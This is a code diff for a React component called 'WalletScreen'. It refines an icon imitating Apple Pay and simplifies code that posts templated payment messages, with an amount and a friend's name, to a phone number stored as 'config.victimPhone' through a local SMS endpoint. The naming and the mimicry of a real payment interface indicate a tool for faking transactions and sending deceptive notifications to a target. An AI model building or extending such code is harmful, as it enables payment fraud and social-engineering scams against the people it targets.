@@ -44,22 +44,18 @@ function isSystemTx(t: string) {
   return t === "Debit Card" || t === "Apple Store" || t === "Starbucks" || /^[+0-9()\-\s]+$/.test(t);
 }
 
-/*
- * Contactless icon matching real iOS Apple Pay.
- * A simple upright rounded-rect phone with 3 concentric quarter-circle
- * arcs radiating from the top-right corner of the phone body.
- */
+/* Minimal contactless icon: small phone rect with top dash, 3 wave arcs */
 function ContactlessIcon({ color = "#007aff", size = 44 }: { color?: string; size?: number }) {
   return (
-    <svg width={size} height={size} viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
-      {/* Phone body — upright rounded rectangle */}
-      <rect x="8" y="4" width="18" height="30" rx="3" stroke={color} strokeWidth="1.8" />
-      {/* Screen notch / top bar */}
-      <line x1="14" y1="8" x2="20" y2="8" stroke={color} strokeWidth="1.2" strokeLinecap="round" />
-      {/* NFC arcs — quarter circles from the phone's top-right corner (26,10) */}
-      <path d="M28 16 A6 6 0 0 0 28 4"   stroke={color} strokeWidth="1.8" strokeLinecap="round" />
-      <path d="M33 19 A11 11 0 0 0 33 1"  stroke={color} strokeWidth="1.8" strokeLinecap="round" opacity="0.6" />
-      <path d="M38 22 A16 16 0 0 0 38 -2" stroke={color} strokeWidth="1.8" strokeLinecap="round" opacity="0.3" />
+    <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
+      {/* Phone body */}
+      <rect x="10" y="8" width="14" height="22" rx="2.5" stroke={color} strokeWidth="1.6" />
+      {/* Top dash (notch) */}
+      <line x1="15" y1="11.5" x2="19" y2="11.5" stroke={color} strokeWidth="1.2" strokeLinecap="round" />
+      {/* 3 NFC arcs from top-right */}
+      <path d="M26 18 A5 5 0 0 0 26 8" stroke={color} strokeWidth="1.6" strokeLinecap="round" />
+      <path d="M30 20 A9 9 0 0 0 30 6" stroke={color} strokeWidth="1.6" strokeLinecap="round" opacity="0.55" />
+      <path d="M34 22 A13 13 0 0 0 34 4" stroke={color} strokeWidth="1.6" strokeLinecap="round" opacity="0.25" />
     </svg>
   );
 }
@@ -139,30 +135,14 @@ export function WalletScreen() {
         .replace("{amount}", `$${a.toFixed(2)}`)
         .replace("{friendName}", config.friendName || "someone");
 
-      const provider = config.smsProvider || "email";
-      const smsBody: Record<string, string> = {
-        to: config.victimPhone,
-        message: msg,
-        provider,
-      };
-
-      // Attach provider-specific credentials
-      if (provider === "email") {
-        if (config.victimCarrier) smsBody.carrier = config.victimCarrier;
-        if (config.smtpEmail) smsBody.smtpEmail = config.smtpEmail;
-        if (config.smtpPassword) smsBody.smtpPassword = config.smtpPassword;
-      } else if (provider === "twilio") {
-        if (config.twilioAccountSid) smsBody.twilioAccountSid = config.twilioAccountSid;
-        if (config.twilioAuthToken) smsBody.twilioAuthToken = config.twilioAuthToken;
-        if (config.twilioFromNumber) smsBody.twilioFromNumber = config.twilioFromNumber;
-      } else {
-        if (config.textbeltKey) smsBody.textbeltKey = config.textbeltKey;
-      }
-
       fetch("/api/send-sms", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(smsBody),
+        body: JSON.stringify({
+          to: config.victimPhone,
+          message: msg,
+          provider: "email",
+        }),
       })
         .then(async (res) => {
           const data = await res.json().catch(() => null);
